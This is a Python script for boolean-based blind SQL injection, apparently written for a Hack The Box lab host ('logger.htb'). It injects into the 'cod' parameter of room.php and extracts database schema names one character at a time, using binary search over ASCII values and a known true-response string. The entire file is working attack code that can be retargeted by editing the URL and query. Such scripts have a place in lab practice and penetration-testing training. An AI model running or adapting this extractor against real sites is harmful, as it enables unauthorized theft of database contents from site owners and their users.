#!/usr/bin/python3

import requests
import string
import sys
import urllib
import signal
from math import floor

#Change the below as needed

#Injection paramater is denoted as {} in URL
URL = "http://logger.htb/room.php?cod={}"
#This should be the full injection including quotes and comments as needed
#String formatters are which query result to return, and the current character of that result
QUERY = "2 AND ascii(substring((SELECT schema_name FROM INFORMATION_SCHEMA.schemata limit {},1),{},1))=CHAR"
TRUE_RESPONSE = "Suite room is perfect"
COOKIES = {"PHPSESSID":"34f8hdthk6clvjqskta054ob53"}
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding":"gzip, deflate",
"DNT":"1",
"Connection":"close"}
PROXY = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

urlencode = urllib.parse.quote

def loop_inject(original_inject):
    if sendrequest(original_inject, '>', 31)[0]:
        if sendrequest(original_inject, '<', 128)[0]:
    #Normal ascii search
            low, high = binarysearch(original_inject,32,127)
    #Extended ascii table, can try to print
        else:
            low, high = binarysearch(original_inject,128,255)
    #Low bit ascii, maybe print as hex
    else:
        low, high = binarysearch(original_inject,0,31)

    for i in range(low, high+1):
        result = sendrequest(original_inject,'=',i)
        if result[0]:
            return result[1]
    
    return "\nEND\n"
        

def binarysearch(original_inject,low,high):
    while abs(high-low) > 2:
        comp = floor((high + low) / 2)
        if (sendrequest(original_inject, '<', comp)[0]):
            high = comp
        elif (sendrequest(original_inject, '>=', comp)[0]):
            low = comp
    return low, high

def sendrequest(org_query, operator, char):
    query = org_query.replace("=CHAR", str(operator) + str(int(char)))
    r = requests.get(URL.format(urlencode(query)), headers=HEADERS, cookies=COOKIES, proxies=PROXY)
    if TRUE_RESPONSE in r.text:
        return True, char
    else:
        return False, char

def main():
    try:
        count = 0
        while True:
            for i in range(1,256):
                original_inject = str(QUERY).format(count,i)
                get_char = loop_inject(original_inject)
                if str(get_char) == "0":
                    count += 1
                    print("")
                    break
                sys.stdout.write(str(chr(get_char)))
                sys.stdout.flush()
    except KeyboardInterrupt:
        print("\nSIGTERM recieved, bye!")

if __name__ == "__main__":
    main()



